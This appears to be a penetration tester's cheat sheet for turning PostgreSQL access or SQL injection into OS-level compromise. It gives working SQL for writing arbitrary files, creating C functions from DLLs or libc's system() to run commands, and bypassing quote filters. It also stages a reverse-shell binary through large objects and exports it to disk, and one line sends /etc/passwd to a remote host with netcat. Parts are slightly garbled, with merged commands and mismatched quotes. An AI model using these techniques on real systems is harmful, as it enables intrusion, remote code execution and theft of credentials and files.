

[PostgreSQL Cheat Cheat](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)

# Create a file on System
## Using COPY ... TO

The file content cannot have break lines. So in order to save the content correctly all break lines should be removed

**decode()** returns a byte array (bytea) not a "hex string"

```
COPY (select convert_from(decode($$my_file_content_here$$, $$base64$$),$$utf-8$$) ) TO $$c:\my_file.txt$$
```

# Creating User Defined Functions

## Check if function **foo** exits
```
SELECT 'foo'::regproc;
```

## User Defined Function (UDF)

For Windows using DLLs
```
CREATE or REPLACE function my_udf_function(text, integer) returns void as $$c:\my_dll.dll$$, $$my_dll_function_name$$ LANGUAGE C STRICT;
```

```
DROP function my_udf_function(text,integer)
```

For Linux 
```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6′, 'system' LANGUAGE 'C' STRICT; — privSELECT system('cat /etc/passwd | nc 10.0.0.1 8080′); — priv, commands run as postgres/pgsql OS-level user
```

Delete function
```
DROP function my_udf_function(text,integer)
```

# Avoiding Quotes

Use Tags to bypass quotes restrictions
```
"select $$test$$" 
```
Is the same as 
```
SELECT "test"
```

# Large Objects - Getting a reverse shell

Steps:
- Create a large object that holds our binary payload
- Export that object on the remote file system
- Create a Postgres User Defined Function (UDF) that uses the file we just exported from the large object as the source
- Trigger UDF and execute payload

Import large object
It's possible to manually set the large object Id (e.g 99) or will be generated.
```
SELECT lo_import($$c:\windows\win.ini$$, 99)
```

They are stored in the table PG_LARGEOBJECT - the data is splitted in 2KB chunks (pages).
If a file is 6kb it will have 3 pages (0,1,2)
```
SELECT loid, pageno FROM pg_largeobject; 

| loid | pageno | data |
------------------------
| 99   | 0      | xxx  |
| 99   | 1      | xxx  |
```


The data is bytea type. When encoding bytea only base64, hex, escape are supported
https://www.postgresql.org/docs/9.1/catalog-pg-largeobject.html
https://www.postgresql.org/docs/9.1/functions-binarystring.html

```
SELECT loid, pageno, encode(data, 'escape') FROM pg_largeobject;
```

We can save a binary into a large object (our reverse shell). For this we need to update the content of the large object. Keeping in mind that each page holds 2Kb of data
```
UPDATE pg_largeobject SET data=decode('hex_payload_here', 'hex') WHERE loid = 99 and pageno= 0
```

In case the reverse shell is bigger than 2kb we need to insert new pages for the larg object.
```
INSERT INTO pg_largeobject (loid, pageno, data) VALUES(99, 1, decode('my_payload_chunk_here', 'hex'));
```

It is possible to export a large object from the database to the file system.
We need to know which large object id, from the last example, we have created using id 99
```
SELECT lo_export(99, $$c:\rev_shell.exe$$)
```

Delete a large object bu the id
```
SELECT lo_unlink(99)
```

